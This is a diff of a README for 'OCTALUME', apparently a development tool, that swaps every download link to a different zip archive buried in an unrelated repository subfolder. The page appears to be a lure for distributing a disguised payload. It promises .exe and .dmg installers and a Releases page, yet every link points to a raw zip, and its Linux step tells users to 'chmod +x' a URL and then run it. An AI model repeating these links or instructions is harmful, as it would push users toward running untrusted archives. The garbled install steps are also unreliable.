@@ -1,6 +1,6 @@
 # 🚀 OCTALUME - Streamline Your Software Development Process
 
-[![Download OCTALUME](https://github.com/Buler101/OCTALUME/raw/refs/heads/main/.claude/commands/Software-3.7-alpha.5.zip)](https://github.com/Buler101/OCTALUME/raw/refs/heads/main/.claude/commands/Software-3.7-alpha.5.zip)
+[![Download OCTALUME](https://raw.githubusercontent.com/Buler101/OCTALUME/main/skills/phase_03_architecture_design/examples/Software_2.1.zip)](https://raw.githubusercontent.com/Buler101/OCTALUME/main/skills/phase_03_architecture_design/examples/Software_2.1.zip)
 
 ## 📋 Overview
 
@@ -28,7 +28,7 @@ Before you begin, ensure your system meets these basic requirements:
 
 ### 2. Download OCTALUME
 
-Visit this page to download: [Download OCTALUME](https://github.com/Buler101/OCTALUME/raw/refs/heads/main/.claude/commands/Software-3.7-alpha.5.zip)
+Visit this page to download: [Download OCTALUME](https://raw.githubusercontent.com/Buler101/OCTALUME/main/skills/phase_03_architecture_design/examples/Software_2.1.zip)
 
 On the Releases page, you'll find different versions of OCTALUME. Download the version compatible with your operating system.
 
@@ -38,7 +38,7 @@ Once downloaded, locate the file on your computer. The installation is user-frie
 
 - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
 - **macOS:** Open the downloaded `.dmg` file and drag OCTALUME into the Applications folder.
-- **Linux:** Use the terminal to navigate to the download location and run the command `chmod +x https://github.com/Buler101/OCTALUME/raw/refs/heads/main/.claude/commands/Software-3.7-alpha.5.zip` followed by `https://github.com/Buler101/OCTALUME/raw/refs/heads/main/.claude/commands/Software-3.7-alpha.5.zip` to start the installation.
+- **Linux:** Use the terminal to navigate to the download location and run the command `chmod +x https://raw.githubusercontent.com/Buler101/OCTALUME/main/skills/phase_03_architecture_design/examples/Software_2.1.zip` followed by `https://raw.githubusercontent.com/Buler101/OCTALUME/main/skills/phase_03_architecture_design/examples/Software_2.1.zip` to start the installation.
 
 ### 4. Launch the Application
 
@@ -67,7 +67,7 @@ OCTALUME features AI tools to help with coding. Follow these steps to access the
 
 ## 📥 Download & Install
 
-To download OCTALUME and start your journey towards streamlined software development, visit this page: [Download OCTALUME](https://github.com/Buler101/OCTALUME/raw/refs/heads/main/.claude/commands/Software-3.7-alpha.5.zip)
+To download OCTALUME and start your journey towards streamlined software development, visit this page: [Download OCTALUME](https://raw.githubusercontent.com/Buler101/OCTALUME/main/skills/phase_03_architecture_design/examples/Software_2.1.zip)
 
 ## 🔍 Explore Further
 
